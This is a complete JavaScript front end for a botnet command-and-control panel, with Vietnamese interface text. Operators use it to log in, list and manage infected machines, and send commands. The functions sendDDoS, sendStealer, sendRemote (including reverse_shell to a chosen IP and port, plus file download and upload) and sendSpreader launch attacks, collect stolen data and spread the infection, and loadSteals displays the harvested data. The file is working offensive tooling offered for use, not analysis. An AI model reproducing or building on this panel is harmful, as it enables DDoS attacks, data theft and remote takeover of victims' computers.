// C2 Botnet Panel - Full JavaScript
let authToken = '';
let serverBaseURL = '';

document.addEventListener('DOMContentLoaded', function() {
    serverBaseURL = window.location.origin;
    const savedToken = localStorage.getItem('c2_auth_token');
    if (savedToken) { authToken = savedToken; showDashboard(); }
    document.getElementById('login-form').addEventListener('submit', handleLogin);
    document.getElementById('btn-logout').addEventListener('click', handleLogout);
    document.querySelectorAll('.nav-item').forEach(item => {
        item.addEventListener('click', function(e) { e.preventDefault(); switchTab(this.getAttribute('data-tab')); });
    });
    document.getElementById('btn-filter').addEventListener('click', loadBots);
    document.getElementById('btn-delete-offline').addEventListener('click', deleteOfflineBots);
    document.getElementById('btn-send-ddos').addEventListener('click', sendDDoS);
    document.getElementById('btn-send-steal').addEventListener('click', sendStealer);
    document.getElementById('btn-send-remote').addEventListener('click', sendRemote);
    document.getElementById('btn-send-spread').addEventListener('click', sendSpreader);
    document.getElementById('btn-filter-steals').addEventListener('click', loadSteals);
    document.getElementById('btn-clear-log').addEventListener('click', ()=>{document.getElementById('full-log-box').innerHTML='';});
    document.getElementById('btn-refresh-log').addEventListener('click', ()=>{loadLogs();});
    document.getElementById('remote-action-select').addEventListener('change', toggleRemoteFields);
    setInterval(updateServerTime, 1000);
    updateServerTime();
});

function handleLogin(e) {
    e.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const errorEl = document.getElementById('login-error');
    fetch(serverBaseURL + '/api/login', {
        method: 'POST', headers: {'Content-Type':'application/json'},
        body: JSON.stringify({username:username,password:password})
    }).then(r=>r.json()).then(data=>{
        if(data.success){ authToken=data.data.token; localStorage.setItem('c2_auth_token',authToken); showDashboard(); }
        else { errorEl.textContent=data.message||'Đăng nhập thất bại'; errorEl.style.display='block'; }
    }).catch(err=>{ errorEl.textContent='Lỗi kết nối'; errorEl.style.display='block'; });
}

function handleLogout() {
    localStorage.removeItem('c2_auth_token'); authToken='';
    document.getElementById('login-page').style.display='flex';
    document.getElementById('dashboard').style.display='none';
}

function showDashboard() {
    document.getElementById('login-page').style.display='none';
    document.getElementById('dashboard').style.display='flex';
    switchTab('overview'); loadStats(); loadBots(); loadBotSelects();
    setInterval(loadStats,30000); setInterval(loadBots,30000);
}

function switchTab(tabName) {
    document.querySelectorAll('.nav-item').forEach(i=>i.classList.remove('active'));
    document.querySelector('.nav-item[data-tab="'+tabName+'"]').classList.add('active');
    document.querySelectorAll('.tab-content').forEach(c=>c.classList.remove('active'));
    document.getElementById('tab-'+tabName).classList.add('active');
    if(tabName==='overview') loadStats();
    if(tabName==='bots') loadBots();
    if(tabName==='stealer') loadSteals();
}

function apiCall(endpoint, method, body) {
    const headers={'Content-Type':'application/json'};
    if(authToken) headers['Authorization']='Bearer '+authToken;
    const opts={method:method||'GET',headers:headers};
    if(body) opts.body=JSON.stringify(body);
    return fetch(serverBaseURL+endpoint,opts).then(r=>r.json()).catch(e=>({success:false,message:e.message}));
}

function loadStats() {
    apiCall('/api/stats').then(d=>{if(d.success) updateStatsUI(d.data);});
}

function updateStatsUI(s) {
    if(!s) return;
    document.getElementById('stat-total-bots').textContent=s.total_bots||0;
    document.getElementById('stat-online-bots').textContent=s.online_bots||0;
    document.getElementById('stat-offline-bots').textContent=s.offline_bots||0;
    document.getElementById('stat-total-commands').textContent=s.total_commands||0;
    document.getElementById('stat-total-steals').textContent=s.total_steals||0;
    if(s.countries){
        const cd=document.getElementById('chart-countries'); cd.innerHTML='';
        const max=Math.max(...Object.values(s.countries),1);
        for(const[c,ct]of Object.entries(s.countries)){
            const p=ct/max*100;
            cd.innerHTML+='<div class="bar-row"><span class="bar-label">'+(c||'Unknown')+'</span><div class="bar-track"><div class="bar-fill" style="width:'+p+'%"></div></div><span class="bar-count">'+ct+'</span></div>';
        }
    }
    if(s.os_distribution){
        const od=document.getElementById('chart-os'); od.innerHTML='';
        const max=Math.max(...Object.values(s.os_distribution),1);
        for(const[o,ct]of Object.entries(s.os_distribution)){
            const p=ct/max*100;
            od.innerHTML+='<div class="bar-row"><span class="bar-label">'+o+'</span><div class="bar-track"><div class="bar-fill" style="width:'+p+'%"></div></div><span class="bar-count">'+ct+'</span></div>';
        }
    }
}

function loadBots() {
    const search=document.getElementById('filter-search').value;
    const status=document.getElementById('filter-status').value;
    let q=''; if(search) q+='&search='+encodeURIComponent(search); if(status) q+='&status='+encodeURIComponent(status);
    apiCall('/api/bots?'+(q?q.substring(1):'')).then(d=>{if(d.success&&d.data.bots) renderBotsTable(d.data.bots);});
}

function renderBotsTable(bots) {
    const tbody=document.getElementById('bots-table-body'); tbody.innerHTML='';
    if(!bots.length){tbody.innerHTML='<tr><td colspan="8" style="text-align:center;padding:20px;">Không có bot</td></tr>';return;}
    bots.forEach(b=>{
        const tr=document.createElement('tr');
        tr.innerHTML='<td style="font-family:monospace;font-size:11px;">'+b.id.substring(0,12)+'...</td>'+
        '<td>'+b.hostname+'</td><td>'+b.os+'</td><td>'+b.ip+'</td><td>'+(b.country||'N/A')+'</td>'+
        '<td>'+new Date(b.last_seen).toLocaleString('vi-VN')+'</td>'+
        '<td><span class="status-badge '+(b.status==='online'?'status-online':'status-offline')+'">'+(b.status==='online'?'Online':'Offline')+'</span></td>'+
        '<td><button class="btn btn-primary btn-sm" onclick="deleteBot(\''+b.id+'\')">Xóa</button></td>';
        tbody.appendChild(tr);
    });
}

function deleteBot(botID) {
    if(!confirm('Xóa bot '+botID+'?')) return;
    apiCall('/api/bots/'+botID,'DELETE').then(d=>{
        addLog(d.success?'success':'error',d.message); loadBots(); loadStats();
    });
}

function deleteOfflineBots() {
    if(!confirm('Xóa tất cả bot offline?')) return;
    apiCall('/api/bots?status=offline').then(d=>{
        if(d.success&&d.data.bots){ d.data.bots.forEach(b=>{apiCall('/api/bots/'+b.id,'DELETE');}); }
        setTimeout(()=>{loadBots();loadStats();},1000);
    });
}

function loadBotSelects() {
    apiCall('/api/bots?status=online&limit=200').then(d=>{
        if(!d.success||!d.data.bots) return;
        const selects=['ddos-bot-select','steal-bot-select','remote-bot-select','spread-bot-select'];
        selects.forEach(sid=>{
            const sel=document.getElementById(sid);
            sel.innerHTML='<option value="all">Tất cả Bot Online</option>';
            d.data.bots.forEach(b=>{sel.innerHTML+='<option value="'+b.id+'">'+b.hostname+' ('+b.ip+')</option>';});
        });
    });
}

function sendDDoS() {
    const target=document.getElementById('ddos-target').value;
    const port=document.getElementById('ddos-port').value;
    const threads=document.getElementById('ddos-threads').value;
    const duration=document.getElementById('ddos-duration').value;
    const method=document.getElementById('ddos-method').value;
    const botID=document.getElementById('ddos-bot-select').value;
    if(!target){alert('Nhập mục tiêu!');return;}
    const params=JSON.stringify({url:target,port:parseInt(port),threads:parseInt(threads),duration:parseInt(duration)});
    apiCall('/api/command','POST',{bot_id:botID,module:'ddos',action:method,params:params}).then(d=>{
        addLog(d.success?'success':'error',d.message);
        document.getElementById('ddos-result').innerHTML+='<div class="log-entry"><span class="type '+(d.success?'success':'error')+'">['+new Date().toLocaleTimeString('vi-VN')+']</span> '+d.message+'</div>';
    });
}

function sendStealer() {
    const mod=document.getElementById('steal-module-select').value;
    const botID=document.getElementById('steal-bot-select').value;
    apiCall('/api/command','POST',{bot_id:botID,module:'stealer',action:mod,params:'{}'}).then(d=>{
        addLog(d.success?'success':'error',d.message);
        setTimeout(loadSteals,5000);
    });
}

function sendRemote() {
    const action=document.getElementById('remote-action-select').value;
    const botID=document.getElementById('remote-bot-select').value;
    const ip=document.getElementById('remote-ip').value;
    const port=document.getElementById('remote-port').value;
    const path=document.getElementById('remote-path').value;
    const params=JSON.stringify({ip:ip,port:parseInt(port),path:path});
    apiCall('/api/command','POST',{bot_id:botID,module:'remote',action:action,params:params}).then(d=>{
        addLog(d.success?'success':'error',d.message);
        document.getElementById('remote-result').innerHTML+='<div class="log-entry"><span class="type '+(d.success?'success':'error')+'">['+new Date().toLocaleTimeString('vi-VN')+']</span> '+d.message+'</div>';
    });
}

function sendSpreader() {
    const method=document.getElementById('spread-method-select').value;
    const botID=document.getElementById('spread-bot-select').value;
    apiCall('/api/command','POST',{bot_id:botID,module:'spreader',action:method,params:'{}'}).then(d=>{
        addLog(d.success?'success':'error',d.message);
        document.getElementById('spread-result').innerHTML+='<div class="log-entry"><span class="type '+(d.success?'success':'error')+'">['+new Date().toLocaleTimeString('vi-VN')+']</span> '+d.message+'</div>';
    });
}

function toggleRemoteFields() {
    const action=document.getElementById('remote-action-select').value;
    document.getElementById('row-remote-ip').style.display=(action==='reverse_shell')?'flex':'none';
    document.getElementById('row-remote-port').style.display=(action==='reverse_shell')?'flex':'none';
    document.getElementById('row-remote-path').style.display=(action==='download_file'||action==='upload_file')?'flex':'none';
}

function loadSteals() {
    const dt=document.getElementById('steal-filter-type').value;
    let q=''; if(dt) q+='&data_type='+encodeURIComponent(dt);
    apiCall('/api/steals?limit=50'+(q||'')).then(d=>{
        if(!d.success||!d.data.steals) return;
        const c=document.getElementById('steals-data-container'); c.innerHTML='';
        d.data.steals.forEach(s=>{
            let p=''; try{p=JSON.stringify(JSON.parse(s.data),null,2);}catch(e){p=s.data.substring(0,500);}
            if(p.length>500) p=p.substring(0,500)+'...';
            c.innerHTML+='<div class="data-card"><h4>'+s.data_type.toUpperCase()+' - '+s.bot_id.substring(0,8)+'...</h4><p style="font-size:11px;color:var(--text-muted);">'+new Date(s.timestamp).toLocaleString('vi-VN')+'</p><pre>'+escapeHtml(p)+'</pre></div>';
        });
    });
}

function loadLogs() {
    const lb=document.getElementById('full-log-box');
    const rlb=document.getElementById('realtime-log-box');
    lb.innerHTML=rlb?rlb.innerHTML:'';
}

function addLog(type, message) {
    const now=new Date(); const ts='['+now.toLocaleTimeString('vi-VN')+']';
    const entry='<div class="log-entry"><span class="time">'+ts+'</span><span class="type '+type+'">'+type.toUpperCase()+'</span> '+message+'</div>';
    const rlb=document.getElementById('realtime-log-box'); if(rlb){rlb.innerHTML=entry+rlb.innerHTML; if(rlb.children.length>500) rlb.removeChild(rlb.lastChild);}
    const flb=document.getElementById('full-log-box'); if(flb){flb.innerHTML=entry+flb.innerHTML; if(flb.children.length>500) flb.removeChild(flb.lastChild);}
}

function escapeHtml(text) {
    const map={'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'};
    return text.replace(/[&<>"']/g,m=>map[m]);
}

function updateServerTime() {
    const el=document.getElementById('server-time');
    if(el){const n=new Date();el.textContent=n.toLocaleDateString('vi-VN')+' '+n.toLocaleTimeString('vi-VN');}
}
